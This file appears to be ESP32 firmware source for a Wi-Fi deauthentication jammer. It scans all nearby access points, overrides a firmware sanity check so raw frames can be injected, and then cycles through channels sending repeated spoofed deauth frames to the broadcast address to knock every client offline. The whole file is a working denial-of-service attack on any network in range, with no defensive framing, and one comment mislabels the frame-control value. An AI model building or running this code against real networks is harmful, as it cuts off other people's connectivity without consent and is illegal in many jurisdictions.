#include <Wi-Fi.h>

struct APInfo {
    uint8_t bssid[6];
    int channel;
};

std::vector<APInfo> apList;
std::vector<int> targetChannels;
unsigned long last_channel_change = 0;
const unsigned long channel_interval = 100;
int channelIndex = 0;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337) { return 1; }
    else { return 0; }
}

WiFi::WiFi() {}

void WiFi::begin() {
    stopJamming();
}

void WiFi::startJamming() {
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
}

void WiFi::stopJamming() {
    esp_wifi_stop();
    esp_wifi_deinit();
}

void WiFi::performScan() {
    stopJamming();
    startJamming();

    wifi_scan_config_t scanConfig = {};
    scanConfig.show_hidden = true;
    esp_wifi_scan_start(&scanConfig, true);

    uint16_t apCount = 0;
    esp_wifi_scan_get_ap_num(&apCount);
    wifi_ap_record_t* apRecords = new wifi_ap_record_t[apCount];
    esp_wifi_scan_get_ap_records(&apCount, apRecords);

    apList.clear();
    std::set<int> uniqueChannels;
    for (int i = 0; i < apCount; i++) {
        APInfo ap;
        memcpy(ap.bssid, apRecords[i].bssid, 6);
        ap.channel = apRecords[i].primary;
        apList.push_back(ap);
        uniqueChannels.insert(ap.channel);
    }
    targetChannels.assign(uniqueChannels.begin(), uniqueChannels.end());

    delete[] apRecords;
    stopJamming();
    startJamming();
}

void sendDeauthPacket(const uint8_t* bssid, const uint8_t* sta) {
    struct {
        uint8_t frame_control[2];
        uint8_t duration[2];
        uint8_t addr1[6];
        uint8_t addr2[6];
        uint8_t addr3[6];
        uint8_t sequence_control[2];
        uint8_t reason_code[2];
    } __attribute__((packed)) deauth_frame;

    deauth_frame.frame_control[0] = 0xC0;       // To DS + From DS + Deauth Frame
    deauth_frame.frame_control[1] = 0x00;
    deauth_frame.duration[0] = 0x00;
    deauth_frame.duration[1] = 0x00;
    memcpy(deauth_frame.addr1, sta, 6);         // STA address
    memcpy(deauth_frame.addr2, bssid, 6);       // AP address
    memcpy(deauth_frame.addr3, bssid, 6);       // AP address
    deauth_frame.sequence_control[0] = 0x00;
    deauth_frame.sequence_control[1] = 0x00;
    deauth_frame.reason_code[0] = 0x01;         // Reason: Unspecified reason
    deauth_frame.reason_code[1] = 0x00;

    esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&deauth_frame, sizeof(deauth_frame), true);
}

void WiFi::executeJamming() {
    if (targetChannels.empty()) return;

    if (millis() - last_channel_change > channel_interval) {
        channelIndex = (channelIndex + 1) % targetChannels.size();
        int currentChannel = targetChannels[channelIndex];
        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
        last_channel_change = millis();

        // Broadcast MAC address
        uint8_t broadcastMac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

        for (const auto& ap : apList) {
            if (ap.channel == currentChannel) {
                // Send multiple deauth frames for effectiveness
                for (int i = 0; i < 5; i++) {
                    sendDeauthPacket(ap.bssid, broadcastMac);
                    delay(1);
                }
            }
        }
    }
}

int WiFi::findedAPs() {
    return apList.size();
}